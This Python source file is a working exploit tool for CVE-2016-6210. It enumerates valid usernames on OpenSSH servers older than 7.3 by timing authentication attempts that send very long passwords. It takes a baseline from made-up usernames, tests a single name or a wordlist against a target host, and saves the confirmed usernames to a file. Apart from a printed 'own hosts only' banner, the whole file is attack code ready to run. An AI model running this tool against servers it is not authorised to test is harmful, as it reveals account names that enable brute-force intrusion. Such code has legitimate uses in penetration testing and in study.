import sys
import paramiko
import time
import numpy
from Helper.Colors import Color
from os import path
from tqdm.auto import tqdm


class SSH_ENUM:

    def __init__(self, host, username, port=22, use_list=False, show_invalid=False):
        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.host = host
        self.port = port
        self.banner = None
        self.nb_users = 0
        self.sample = 14
        self.bytes = 50000
        self.factor = float(3)
        self.trials = 1
        self.users = self.get_users(username, use_list)
        self.show_invalid = show_invalid
        self.progress_bar = tqdm(total=self.nb_users, position=0, leave=False)

    def run(self):
        Color.print_warning("*==============================================================*")
        Color.print_warning("| Use against your own hosts only! Attacking stuff you are not |")
        Color.print_warning("| permitted to may put you in big trouble!                     |")
        Color.print_warning("*==============================================================*")
        Color.print_infos("*=======================*")
        Color.print_infos("| S U M M A R Y  C V E  |")
        Color.print_infos("*=======================*")
        Color.print_infos("CVE : CVE-2016-6210")
        Color.print_infos("OPENSSH-VERSION: OpenSSH < 7.3")
        Color.print_infos("Purpose: User name enumeration against SSH daemons affected by CVE-2016-6210.")
        Color.print_infos("Prerequisites: Network access to the SSH daemon.")
        Color.print_infos("*===========================*")
        Color.print_infos("| S U M M A R Y  I N F O S  |")
        Color.print_infos("*===========================*")
        Color.print_infos("SSH HOST : " + str(self.host))
        Color.print_infos("SSH PORT : " + str(self.port))
        Color.print_infos("NB USERNAME : " + str(self.nb_users))
        Color.print_infos("SSH BANNER : " + str(self.get_banner(self.host, self.port)))
        self.exploit()

    # ///////////////////////////////// < SECTION INIT HELPER > /////////////////////////////////////////////////

    def get_users(self, username, use_list):
        if use_list:
            if username is not None and path.isfile(username):
                with open(username, "r") as f:
                    users = f.readlines()
                self.nb_users = len(users)
                return users
            else:
                Color.print_error("[-] username file list not found : " + str(username))
                exit(1)
        else:
            self.nb_users = 1
            return username

    # ///////////////////////////////// < SECTION SSH HELPER > /////////////////////////////////////////////////

    def get_banner(self, host, port):
        try:
            self.ssh.connect(hostname=host, port=port, username='invalidinvalidinvalid', password='invalidinvalidinvalid')
        except:
            self.banner = self.ssh.get_transport().remote_version
            self.ssh.close()
            return self.banner

    def connect(self, host, port, user):
        end_time = 0.0
        p = 'B' * int(self.bytes)
        start_time = time.time()
        try:
            self.ssh.connect(hostname=host, port=port, username=user, password=p, look_for_keys=False, gss_auth=False,
                             gss_kex=False, gss_deleg_creds=False, gss_host=None, allow_agent=False)
        except:
            end_time = time.time()

        finally:
            self.ssh.close()
            return end_time - start_time

    def exploit(self):
        # get baseline timing for non-existing users...
        baseline_samples = []
        baseline_mean = 0.0
        baseline_deviation = 0.0
        Color.print_infos("Getting baseline timing for authenticating non-existing users")

        for i in range(1, int(self.sample) + 1):
            sample = self.connect(self.host, self.port, 'foobar-bleh-nonsense' + str(i))
            baseline_samples.append(sample)

        # remove the biggest and smallest value
        baseline_samples.sort()
        baseline_samples.pop()
        baseline_samples.reverse()
        baseline_samples.pop()

        # Do Match
        baseline_mean = numpy.mean(numpy.array(baseline_samples))
        baseline_deviation = numpy.std(numpy.array(baseline_samples))

        Color.print_infos("Baseline mean for host " + self.host + " is " + str(baseline_mean) + " seconds.")
        Color.print_infos("Baseline variation for host " + self.host + " is " + str(baseline_deviation) + " seconds.")

        upper = baseline_mean + float(self.factor) * baseline_deviation
        Color.print_infos("Defining timing of x < " + str(upper) + " as non-existing user.\n")

        Color.print_success("Launching SSH enumeration Now... ")
        cpt = 0
        match = 0
        f = open("ssh-user.txt", "a")
        f_log = open("ssh-log.log", "a")

        try:
            for u in self.users:
                user = u.strip()
                enum_samples = []
                enum_mean = 0.0
                for t in range(0, int(self.trials)):
                    timeval = self.connect(self.host, self.port, user)
                    enum_samples.append(timeval)
                enum_mean = numpy.mean(numpy.array(enum_samples))
                self.progress_bar.set_description("Exploit Running...".format(cpt))
                self.progress_bar.update(1)
                cpt += 1
                if enum_mean < upper:
                    if self.show_invalid:
                        Color.print_error("[-] Error invalid user : " + user)
                        f_log.write("[-] Error invalid user : " + user)
                else:
                    match += 1
                    Color.print_success("\n[+] Success: " + user + " is valid user")
                    f_log.write("[+] Success: " + user + " is valid user" + " - timing: " + str(enum_mean))
                    f.write(user)
            f.close()
            f_log.close()
            Color.print_success("Exploit Finished !")
            Color.print_success(str(match) + " User(s) Found in " + self.host)
            Color.print_infos("you can see the list of user as ssh-user.txt and the log into ssh-log.log")

        except KeyboardInterrupt:
            print("exit gracefully, Thank's to use this Tools")
            f.close()
            f_log.close()
            sys.exit(0)
